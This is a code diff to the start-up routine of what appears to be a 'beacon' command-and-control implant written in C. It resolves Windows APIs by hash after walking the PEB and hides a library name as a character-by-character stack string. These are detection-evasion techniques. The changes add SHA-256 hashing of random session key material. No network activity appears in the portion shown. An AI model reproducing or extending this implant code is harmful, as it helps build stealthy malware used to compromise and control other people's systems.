@@ -26,18 +26,18 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 {
 	BEACON_INSTANCE Ins = { 0 };
 	UCHAR           Str[MAX_PATH];
-	PVOID           Img;
+	PVOID           Ptr;
 
-	if ((Img = PebGetModule( H_KERNEL32 )) != NULL) 
+	if ((Ptr = PebGetModule( H_KERNEL32 )) != NULL) 
 	{
-		Ins.api.LocalLock    = PeGetFuncEat( Img, H_LOCALLOCK );
-		Ins.api.LocalFree    = PeGetFuncEat( Img, H_LOCALFREE );
-		Ins.api.LocalSize    = PeGetFuncEat( Img, H_LOCALSIZE );
-		Ins.api.LocalAlloc   = PeGetFuncEat( Img, H_LOCALALLOC );
-		Ins.api.FreeLibrary  = PeGetFuncEat( Img, H_FREELIBRARY );
-		Ins.api.LocalUnlock  = PeGetFuncEat( Img, H_LOCALUNLOCK );
-		Ins.api.LocalReAlloc = PeGetFuncEat( Img, H_LOCALREALLOC );
-		Ins.api.LoadLibraryA = PeGetFuncEat( Img, H_LOADLIBRARYA );
+		Ins.api.LocalLock    = PeGetFuncEat( Ptr, H_LOCALLOCK );
+		Ins.api.LocalFree    = PeGetFuncEat( Ptr, H_LOCALFREE );
+		Ins.api.LocalSize    = PeGetFuncEat( Ptr, H_LOCALSIZE );
+		Ins.api.LocalAlloc   = PeGetFuncEat( Ptr, H_LOCALALLOC );
+		Ins.api.FreeLibrary  = PeGetFuncEat( Ptr, H_FREELIBRARY );
+		Ins.api.LocalUnlock  = PeGetFuncEat( Ptr, H_LOCALUNLOCK );
+		Ins.api.LocalReAlloc = PeGetFuncEat( Ptr, H_LOCALREALLOC );
+		Ins.api.LoadLibraryA = PeGetFuncEat( Ptr, H_LOADLIBRARYA );
 
 		Str[0x0] = 'c';
 		Str[0x1] = 'r';
@@ -73,12 +73,14 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 		Ins.Module[1] = Ins.api.LoadLibraryA( CPTR( Str ) );
 		Ins.api.CryptDecrypt         = PeGetFuncEat( Ins.Module[1], H_CRYPTDECRYPT );
 		Ins.api.CryptEncrypt         = PeGetFuncEat( Ins.Module[1], H_CRYPTENCRYPT );
+		Ins.api.CryptHashData        = PeGetFuncEat( Ins.Module[1], H_CRYPTHASHDATA );
 		Ins.api.CryptGenRandom       = PeGetFuncEat( Ins.Module[1], H_CRYPTGENRANDOM );
 		Ins.api.CryptImportKey       = PeGetFuncEat( Ins.Module[1], H_CRYPTIMPORTKEY );
 		Ins.api.CryptCreateHash      = PeGetFuncEat( Ins.Module[1], H_CRYPTCREATEHASH );
 		Ins.api.CryptDestroyKey      = PeGetFuncEat( Ins.Module[1], H_CRYPTDESTROYKEY );
 		Ins.api.CryptDestroyHash     = PeGetFuncEat( Ins.Module[1], H_CRYPTDESTROYHASH );
 		Ins.api.CryptSetKeyParam     = PeGetFuncEat( Ins.Module[1], H_CRYPTSETKEYPARAM );
+		Ins.api.CryptGetHashParam    = PeGetFuncEat( Ins.Module[1], H_CRYPTGETHASHPARAM );
 		Ins.api.CryptReleaseContext  = PeGetFuncEat( Ins.Module[1], H_CRYPTRELEASECONTEXT );
 		Ins.api.CryptAcquireContextA = PeGetFuncEat( Ins.Module[1], H_CRYPTACQUIRECONTEXTA );
 
@@ -126,8 +128,17 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 		{
 			if ( CryptRsaInit( &Ins ) )
 			{
-				if ( Ins.api.CryptGenRandom( Ins.key[0].Provider, 16, Key ) )
+				if ( Ins.api.CryptGenRandom( Ins.key[0].Provider, 16, Str ) )
 				{
+					if ((Ins.key[1].Ptr = Sha256Sum( &Ins, CPTR( UPTR( Str ) + 0 ), 8 )))
+					{
+						if ((Ins.key[2].Ptr = Sha256Sum( &Ins, CPTR( UPTR( Str ) + 8 ), 8 )))
+						{
+							Ins.api.LocalFree( Ins.key[2].Ptr );
+						};
+						Ins.api.LocalFree( Ins.key[1].Ptr );
+					};
+					__builtin_memset( Str, 0, 16 );
 				};
 				CryptRsaFree( &Ins );
 			};
